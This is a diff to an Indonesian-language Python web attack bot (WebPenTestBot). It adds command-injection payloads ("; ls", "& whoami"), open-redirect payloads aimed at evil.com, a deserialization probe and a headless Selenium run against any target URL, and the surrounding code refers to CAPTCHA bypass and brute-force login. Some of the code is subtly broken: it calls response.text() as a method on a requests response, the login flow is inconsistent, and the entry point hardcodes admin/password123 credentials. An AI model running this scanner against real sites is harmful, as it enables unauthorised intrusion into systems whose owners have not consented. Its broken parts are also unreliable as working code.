@@ -10,6 +10,7 @@ from bs4 import BeautifulSoup
 from concurrent.futures import ThreadPoolExecutor
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.by import By
 
 class Colors:
     RESET = "\033[0m"
@@ -168,50 +169,101 @@ class WebPenTestBot:
             else:
                 self.log(f"{Colors.RED}[x] Gagal melewati CAPTCHA di {url}{Colors.RESET}")
 
-    async def analyze_site(self):
-        paths = ['/login', '/admin', '/upload', '/search', '/user', '/config', '/files', '/data']
+    async def test_command_injection(self, path):
+        payloads = [
+            "; ls",  
+            "| dir",  
+            "& whoami",  
+        ]
+        url = self.base_url + path
+        for payload in payloads:
+            data = {'input': payload}
+            async with self.session.post(url, data=data, headers=self.generate_random_headers()) as response:
+                if 'root' in await response.text() or 'Administrator' in await response.text():
+                    self.log(f"{Colors.GREEN}[!] Command Injection berhasil pada: {url}{Colors.RESET}")
+                else:
+                    self.log(f"{Colors.RED}[x] Tidak ada Command Injection di {url}{Colors.RESET}")
+
+    async def test_open_redirect(self, path):
+        payloads = [
+            "http://evil.com",
+            "https://malicious.com",
+            "http://localhost:8080"
+        ]
+        url = self.base_url + path
+        for payload in payloads:
+            data = {'redirect_url': payload}
+            async with self.session.post(url, data=data, headers=self.generate_random_headers()) as response:
+                if response.url != url:
+                    self.log(f"{Colors.GREEN}[!] Open Redirect berhasil di {url} menuju: {response.url}{Colors.RESET}")
+                else:
+                    self.log(f"{Colors.RED}[x] Tidak ada Open Redirect di {url}{Colors.RESET}")
+
+    async def test_insecure_deserialization(self, path):
+        url = self.base_url + path
+        payload = {"data": "eyJ1c2VyX2lkIjogMSwgImVtYWlsIjogImFkbWluQG1haWwuY29tIn0="}  # Base64 encoded serialized object
+        async with self.session.post(url, json=payload, headers=self.generate_random_headers()) as response:
+            if "error" in await response.text():
+                self.log(f"{Colors.RED}[x] Gagal melakukan uji insecure deserialization di {url}{Colors.RESET}")
+            else:
+                self.log(f"{Colors.GREEN}[!] Potensi insecure deserialization ditemukan di {url}{Colors.RESET}")
+
+    def configure_selenium(self):
+        options = Options()
+        options.headless = True
+        options.add_argument("--no-sandbox")
+        options.add_argument("--disable-dev-shm-usage")
+        options.add_argument("--disable-gpu")
+        return webdriver.Chrome(options=options)
+
+    def run_selenium_test(self):
+        driver = self.configure_selenium()
+        driver.get(self.base_url)
+        try:
+            search_box = driver.find_element(By.NAME, "search")
+            search_box.send_keys("test")
+            search_box.submit()
+            self.log(f"{Colors.GREEN}[+] Pengujian dengan Selenium berhasil di {self.base_url}{Colors.RESET}")
+        except Exception as e:
+            self.log(f"{Colors.RED}[x] Error pengujian Selenium: {str(e)}{Colors.RESET}")
+        finally:
+            driver.quit()
+
+    async def execute_all_tests(self):
+        paths = ['/login', '/admin', '/profile', '/search']  # Ubah dengan path yang relevan
         tasks = []
         for path in paths:
             tasks.append(self.test_sql_injection(path))
             tasks.append(self.test_xss(path))
             tasks.append(self.test_csrf(path))
-            tasks.append(self.brute_force_login(path))
             tasks.append(self.cache_poisoning(path))
-            tasks.append(self.api_security_test(path))
-            tasks.append(self.bypass_captcha(path))
+            tasks.append(self.test_command_injection(path))
+            tasks.append(self.test_open_redirect(path))
+            tasks.append(self.test_insecure_deserialization(path))
         await asyncio.gather(*tasks)
 
-    async def login(self):
-        if self.login_url and self.credentials:
-            login_page = await self.get_html(self.login_url)
-            if login_page:
-                async with self.session.post(self.base_url + self.login_url, data=self.credentials, headers=self.generate_random_headers()) as response:
-                    if 'Welcome' in await response.text():
-                        self.log(f"{Colors.GREEN}[+] Login berhasil!{Colors.RESET}")
-                    else:
-                        self.log(f"{Colors.RED}[x] Login gagal!{Colors.RESET}")
-            else:
-                self.log(f"{Colors.RED}[x] Tidak dapat mengakses halaman login.{Colors.RESET}")
+    def login(self):
+        if not self.login_url or not self.credentials:
+            self.log(f"{Colors.RED}[x] Tidak ada URL login atau kredensial yang disediakan!{Colors.RESET}")
+            return
 
-    async def run(self):
-        await self.analyze_site()
-
-async def main():
-    target_url = input(f"{Colors.BLUE}Masukkan URL target (misal: http://example.com): {Colors.RESET}").strip()
-    if not target_url.startswith("http://") and not target_url.startswith("https://"):
-        print(f"{Colors.RED}URL tidak valid. Pastikan URL dimulai dengan http:// atau https://{Colors.RESET}")
-    else:
-        proxy = input(f"{Colors.CYAN}Masukkan proxy (misal: http://127.0.0.1:8080) atau tekan Enter untuk melewati: {Colors.RESET}")
-        login_url = input(f"{Colors.YELLOW}Masukkan URL login (misal: /login) atau tekan Enter untuk melewati: {Colors.RESET}")
-        if login_url:
-            username = input(f"{Colors.GREEN}Masukkan username untuk login: {Colors.RESET}")
-            password = input(f"{Colors.GREEN}Masukkan password untuk login: {Colors.RESET}")
-            credentials = {'username': username, 'password': password}
+        username, password = self.credentials
+        self.log(f"{Colors.BLUE}[+] Melakukan login dengan username {username} dan password {password}{Colors.RESET}")
+        data = {'username': username, 'password': password}
+        response = requests.post(self.login_url, data=data, headers=self.generate_random_headers())
+        if response.status_code == 200 and 'Welcome' in response.text():
+            self.log(f"{Colors.GREEN}[+] Login berhasil ke {self.login_url}{Colors.RESET}")
         else:
-            credentials = None
+            self.log(f"{Colors.RED}[x] Login gagal ke {self.login_url}{Colors.RESET}")
 
-        bot = WebPenTestBot(target_url, proxy if proxy else None, login_url, credentials)
-        await bot.run()
+    def start_testing(self):
+        asyncio.run(self.execute_all_tests())
+        self.run_selenium_test()
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    # Ubah dengan URL target yang sesuai dan jika diperlukan, kredensial login
+    bot = WebPenTestBot(base_url="http://target-website.com", 
+                        proxy=None, 
+                        login_url="http://target-website.com/login", 
+                        credentials=("admin", "password123"))
+    bot.start_testing()
